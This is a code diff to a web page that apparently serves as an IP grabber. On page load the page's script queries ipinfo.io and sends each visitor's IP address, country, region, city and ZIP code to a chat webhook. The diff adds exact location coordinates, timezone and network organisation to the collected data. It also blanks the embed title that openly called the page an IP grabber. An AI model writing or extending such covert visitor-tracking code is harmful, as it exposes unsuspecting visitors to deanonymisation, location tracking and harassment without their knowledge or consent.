@@ -83,13 +83,17 @@
             content: "**Data Logged, Awaiting Further Instructions**",
             embeds: [
                  {
-                      title: "Someone visited the IP grabber!",
+                      title: "",
                       color: 1752220,
                       description: "**IP:** `" + json.ip + 
                       "`\n**Country:** `" + json.country + 
                       "`\n**Region:** `" + json.region + 
                       "`\n**Town/City:** `" + json.city + 
-                      "`\n**ZIP:** `" + json.postal + "`"
+                      "`\n**ZIP:** `" + json.postal +
+                      "`\n**Loc:** `" + json.loc +
+                      "`\n**Timezone:** `" + json.timezone +
+                      "`\n**Org:** `" + json.org + "`"
+
                  }
             ]
        }
@@ -98,7 +102,6 @@
   }
   </script>
   <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
-  
 
   </body>
 </html>
